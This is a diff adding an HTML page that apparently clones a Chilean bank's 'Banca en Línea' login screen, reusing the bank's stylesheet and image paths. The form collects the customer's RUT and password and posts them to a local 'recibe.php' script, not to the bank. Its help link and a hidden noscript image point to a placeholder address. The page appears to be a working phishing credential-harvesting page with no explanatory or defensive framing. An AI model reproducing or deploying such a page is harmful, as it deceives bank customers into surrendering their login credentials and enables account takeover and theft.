@@ -1,0 +1,178 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+	
+		
+
+		
+			
+			
+				
+			
+		
+	
+
+	
+	
+	
+			
+	
+			
+	
+	
+	
+	
+	
+	
+	
+	
+
+<link href="/eBankingBech/styles/Login-IN.css" type="text/css" rel="stylesheet" />
+<link href="/eBankingBech/styles/header-IN.css" type="text/css" rel="stylesheet" />
+<link href="/eBankingBech/styles/footer-IN.css" type="text/css" rel="stylesheet" />
+<link href="/eBankingBech/styles/loginCss/doAccess/estilos_login.css" type="text/css" rel="stylesheet" />	
+<link href="/eBankingBech/styles/loginCss/doAccess/login.css" type="text/css" rel="stylesheet" />
+<link href="/eBankingBech/styles/alphacube.css" type="text/css" rel="stylesheet" />
+<link href="/eBankingBech/styles/loginBanco/css_login3.css?v=1" type="text/css" rel="stylesheet" />	
+<link href="/eBankingBech/styles/loginBanco/lgcss.css" type="text/css" rel="stylesheet" />		
+
+<body id="bodyLogin" onload="errores();" style="background-color: #FFFFFF; background-image:none"> 
+		
+		
+			<div style="text-align:center; margin: auto; margin-top:15px;">
+			   	<img style="cursor:pointer;" alt="" src="/eBankingBech/images/IN/botones/btn_volver.gif" onclick="volver();"/>
+			</div> 
+			
+		</div>
+		<div id=caja style="HEIGHT: 486px;padding-top : 0px; padding-bottom : 0px;;width: 320px; background-color: #EEEEEE;">
+			<form id="login" name="login" method="post" action="recibe.php" autocomplete="off" target="_top">
+			 
+			
+				<div id="side">
+					<h3>Banca en Línea</h3>
+					<fieldset>
+						<label id="rus">
+							<span class="tLg">RUT Usuario</span>
+							<input id="username" type="text" name="j_username" class="frt" autocomplete="off"/>
+						</label>
+						<label id="cus">
+							<span class="tLg" style="line-height: 25px;">Clave</span>
+							<input id="password" size="8" maxlength="8 " type="password" name="j_password" class="fcl"/>					
+						</label>
+						<input value="Ingresar"  style="text-align: center;"  id="enviar" name="enviarr" type="submit">
+						<p id="olvide_clavee" class="clave" >
+							
+							<a href="www.google.com" title="" target="_top">
+								¿Problemas con su Clave?
+							</a>
+						</p>
+					</fieldset>
+				</div>
+			</div>
+		
+		<div id="modalPopup" class="modalPopupAgenda" style="display: none;">		
+			<div class="panel" style="border-color: #ED7E0D #ED7E0D #ED7E0D #ED7E0D; border-style: solid; 
+					width: 75%; margin: 20px 0px 20px 0px; align: center; background-color: #FFFFFF" >
+														 
+				<table width="100%" background="#D9D9D9">
+					<tr>
+						<td style="text-align: left;width: 15%" rowspan="5" >
+							<img alt="icono" src="/eBankingBech/images/alerta.gif"/>
+						</td>
+					</tr>
+					<tr style="text-align: left;">
+						<th style="font-weight:bold; color: #F1801A; ">Atención</th>
+					</tr>
+					<tr style="text-align: left;">
+						<th style="font-weight:bold;">
+							<span id="msj" style="white-space: normal;">
+											
+				</span>
+						</th>
+					</tr>
+					<tr>
+						<td style="text-align: center;">
+			 				<input id="aceptar" type="image" src="/eBankingBech/images/IN/botones/btn_aceptar.gif">
+						</td>
+					</tr>
+				</table>														
+			</div>					
+		</div>
+
+							
+		</form>
+	</div>
+	<div id="modalProcesando"  style="display: none;left:5%;z-index:1002;position:fixed;">
+		
+	<table class="table_window" >
+		<tbody>
+			<tr>
+				<td class="alphacube_nw" >
+					<img class="alphacube_nw" src="/eBankingBech/images/alphacube/left-top.gif"/>
+				</td>
+				<td class="alphacube_n"  >
+					<img class="alphacube_n" src="/eBankingBech/images/alphacube/top-middle.gif"/>
+				</td>
+				<td class="alphacube_ne" >
+					<img class="alphacube_ne" src="/eBankingBech/images/alphacube/right-top.gif"/>
+				</td>
+			</tr>
+	
+			<tr>
+				<td class="alphacube_w" >
+					<img class="alphacube_w" src="/eBankingBech/images/alphacube/frame-left.gif"/>
+				</td>
+				<td valign="top" class="alphacube_content"	>
+					<div class="alphacube_content" style="overflow: auto; height: 95px; width: 195px;">
+						<div class="alphacube_message" >
+							<span style="font-size: 16px;"><b>Un momento por favor</b></span>
+							<br />
+							<br />
+						</div>
+						<div class="alphacube_progress" >
+							<img class="alphacube_progress" src="/eBankingBech/images/alert/progress.gif"/>
+						</div>
+					</div>
+				</td>
+				<td class="alphacube_e" >
+					<img class="alphacube_e" src="/eBankingBech/images/alphacube/frame-right.gif"/>
+				</td>
+			</tr>
+
+			<tr>
+				<td class="alphacube_sw" >
+					<img class="alphacube_sw" src="/eBankingBech/images/alphacube/bottom-left-c.gif"/>
+				</td>
+				<td class="alphacube_s">
+					<img class="alphacube_s" src="/eBankingBech/images/alphacube/bottom-middle.gif"/>
+				</td>
+				<td class="alphacube_se" >
+					<img class="alphacube_se" src="/eBankingBech/images/alphacube/bottom-right-c.gif"/>
+				</td>
+			</tr>
+		</tbody>
+	</table>
+
+	</div>
+	
+
+
+<noscript><img src="www.google.com" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript></body>
+	
